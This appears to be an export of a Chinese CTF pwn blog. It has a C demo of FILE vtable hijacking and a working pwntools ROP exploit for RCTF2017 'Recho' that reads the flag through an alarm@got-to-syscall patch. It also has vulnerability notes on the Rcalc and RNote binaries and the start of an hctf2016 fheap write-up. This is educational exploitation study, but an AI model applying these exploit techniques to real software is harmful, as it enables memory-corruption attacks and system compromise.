<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这样子就不给他们在堆上分配缓冲区了, 所以这样子是为了不干扰做题吗</p>
<p>卧槽…我是在哪看见篇文章说是在IO操作前, 分配个堆, 再free, 就能把free掉的空间给了FILE, 嗷, 找到了<a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">是这篇</a></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Dave, my mind is going.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// "extra word"</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// DUMMY</span>
    exit<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// finish</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// overflow</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// underflow</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// uflow</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// pbackfail</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsputn</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsgetn</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekoff</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekpos</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// setbuf</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// sync</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// doallocate</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// read</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// write</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seek</span>
    pwn<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// close</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// stat</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// showmanyc</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// imbue</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>  
    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sizeof(FILE): 0x%x\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">/* Allocate and free enough for a FILE plus a pointer. */</span>
    str <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"freeing %p\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">/* Open a file, observe it ended up at previous location. */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fopen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FILE got %p\n"</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_IO_jump_t @ %p is 0x%08lx\n"</span><span class="token punctuation">,</span> str <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* Overwrite vtable pointer. */</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>funcs<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_IO_jump_t @ %p now 0x%08lx\n"</span><span class="token punctuation">,</span>
    str <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* Trigger call to pwn(). */</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RCTF2017 pwn | 补题]]></title>
      <url>/2018/04/06/RCTF2017-pwn-%E8%A1%A5%E9%A2%98/</url>
      <content type="html"><![CDATA[<h2 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h2><p>64位栈溢出<br>有两个点</p>
<ul>
<li>第一个在于如何停止输入数据, 就是让read返回0, 然后执行我们的ROP…这个是用<code>p.shutdown(&#39;send&#39;)</code></li>
<li>第二个在于我们停止输入了…就没办法getshell了, 只能readflag, 所以这里改动<code>alarm@got</code>的指向, 指向<code>syscall</code>, 就可以使用<code>open -&gt; read -&gt; write</code>这样子读取flag, 更改<code>alarm@got</code>, 我们用<code>add byte ptr[rdi], al; ret</code></li>
</ul>
<p>这个第二点表述的比较奇怪…就是我们只能输入一次, 然后就shutdown, 开始ROP, 没有第二次交互机会</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding: utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./Recho"</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./Recho"</span><span class="token punctuation">)</span>

rax_ret     <span class="token operator">=</span> <span class="token number">0x4006fc</span>
rdi_ret     <span class="token operator">=</span> <span class="token number">0x4008a3</span>
rdx_ret     <span class="token operator">=</span> <span class="token number">0x4006fe</span>
rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x4008a1</span>
add_rdi_ret <span class="token operator">=</span> <span class="token number">0x40070d</span> <span class="token comment" spellcheck="true"># add byte ptr[rdi], al; ret</span>

<span class="token triple-quoted-string string">'''
gdb-peda$ x/5i alarm
   0x7ffff7ad9200 &lt;alarm>:    mov    eax,0x25
   0x7ffff7ad9205 &lt;alarm+5>:    syscall 
'''</span>
payload  <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rdi_ret<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
这样子的话, alarm@plt存储的就是syscall, 通过传递eax(rax), 起来不同的函数
由于已经有了read和write, 所以只有open需要使用syscall...read, write布置好参数调用就行了
'''</span>

flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span>


<span class="token comment" spellcheck="true"># open(filename = 'flag', flags = 2, mode = 0)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># read(fd = 3, buf= bss, size = 0x20)</span>
<span class="token comment" spellcheck="true"># fd[0..2] = stdin, stdout, stderr</span>
<span class="token comment" spellcheck="true"># 好像这个是递增的..?</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># write(fd = 1, buf= bss, size = 0x20)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1000'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Rcacl"><a href="#Rcacl" class="headerlink" title="Rcacl"></a>Rcacl</h2><p>题目上来, IDA观察main函数</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_400A06</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x78u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_400FA2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个…<code>sub_400A06</code>, 大概是这样的…不知道要干啥</p>
<pre class="line-numbers language-c"><code class="language-c">qword_6020F8 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
qword_6020F0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>

qword_6020F8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
qword_6020F8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>

qword_6020F0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
qword_6020F0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x320</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单看了一下<br><code>0x6020F0</code>是实现了一个类似canary的功能</p>
<p><code>0x6020F8</code>是实现了结果的存储功能, 包括了结果的数量和具体的值, 堆上存的是具体的数值, 8字节一个.</p>
<p>第二个函数<code>sub_400FA2</code>是主要功能实现</p>
<p>功能大概</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_400BEE</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1.Add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2.Sub"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3.Mod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4.Multi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5.Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>GG, 看了一遍没发现洞在哪…</p>
<p>蠢哭自己…在输入名字的地方, 有一个scanf, 可以溢出…但题目中有自己写的栈保护机制</p>
<p>结合前面结果存储那里, 没有验证存储的结果数量, 而又是相对栈保护机制的堆块的低地址, 所以貌似可以溢出到高地址的地方来, 改掉自己实现的canary?</p>
<p>需要注意的是, scanf遇到空格<code>\x20</code>也会截断<br>不只空格…还有<code>\x09</code>, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code>, <code>\x0d</code>…等等</p>
<p>因为这些不可用字符, 所以在构造ROP上还是比较难<br>之后好好写一下wp…</p>
<p>poc稍后放上来</p>
<p>今天好累==, 想睡觉了</p>
<h2 id="RNote"><a href="#RNote" class="headerlink" title="RNote"></a>RNote</h2><p>主要功能</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token number">1</span><span class="token punctuation">.</span>Add new note
<span class="token number">2</span><span class="token punctuation">.</span>Delete a note
<span class="token number">3</span><span class="token punctuation">.</span>Show a note
<span class="token number">4</span><span class="token punctuation">.</span>Exit
<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>主要结构体</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> Note<span class="token punctuation">{</span>
    <span class="token keyword">int</span> inuse<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 4</span>
    <span class="token keyword">int</span> len<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 4</span>
    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 16</span>
    <span class="token keyword">char</span> <span class="token operator">*</span> ptr<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 8</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// total 32</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我对数据类型产生了….64bit/gcc环境下, int到底是多大…<br>测了一下..我本机是…4字节…<br>这个应该就是编译器决定的吧</p>
<pre><code>The sizeof a type is determined by the compiler

Size of a pointer should be 8 byte on any 64-bit C/C++ compiler, but not necessarily size of int.
</code></pre><p>指针类型应该是32位的4字节, 64位的8字节</p>
<p>在add_note的函数里, 在输入title的时候, 调用的接受输入的函数, 貌似有<code>off-by-one</code></p>
<pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_4009C7</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Bh] [bp-5h]@2</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-4h]@1</span>

<span class="token operator">=</span><span class="token operator">></span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> 
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以控制存储内容的堆地址的最低位…这样的话, 可以leak地址…但好像没有修改之类的功能啊, 该怎么getshell</p>
<p>最后还是参考了这个writeup, <a href="https://drigg3r.gitbooks.io/ctf-writeups-2017/rctf-2017/rnotepwn.html" target="_blank" rel="external">https://drigg3r.gitbooks.io/ctf-writeups-2017/rctf-2017/rnotepwn.html</a></p>
<p>仔细看一下ctf-wiki里关于fastbin_attack的介绍</p>
<h2 id="RNote2"><a href="#RNote2" class="headerlink" title="RNote2"></a>RNote2</h2><p>这题暂时不复现, 先补0ctf_2017的<code>babyheap</code>和<code>easiestprintf</code>, 还有某<code>b00ks</code>, 还有lctf的pwn200, 这个 <a href="http://pwn4.fun/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" target="_blank" rel="external">http://pwn4.fun/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/</a></p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn | hctf2016 fheap]]></title>
      <url>/2018/04/06/pwn-hctf2016-fheap/</url>
      <content type="html"><![CDATA[<p>笑死…一上午就建结构体了….真是没建过不熟悉操作..添加一个成员要在ends那里点<code>d</code>, 要在前面点<code>d</code>就是更改这个成员的大小了, 有<code>db</code>, <code>dw</code>, <code>dd</code>, <code>dq</code>可以选…对应1, 2, 4, 8字节<br>还有数组的话…经常是由于对齐的原因, 源代码中0x100的数组在ida里看到可能会多出来个4字节之类的.<br>设置类型的时候选数组和选指针是很不一样的…显示出来就不一样<br>64bit的程序出现<code>&amp;unk_balabala + 4 * i</code>, 说明这个很可能是个大小为<code>4 * 8 = 0x20</code>大小的结构…出现<code>(一堆转换)(&amp;unk_balabala + 4 * i)(arg1, arg2)</code>说明这个偏移上是一个函数指针…应该是做得多了就熟悉了…我好菜QAQ</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><pre><code>00000000 ; Ins/Del : create/delete structure
00000000 ; D/A/*   : create structure member (data/ascii/array)
00000000 ; N       : rename structure or structure member
00000000 ; U       : delete structure member
00000000 ; ---------------------------------------------------------------------------
00000000
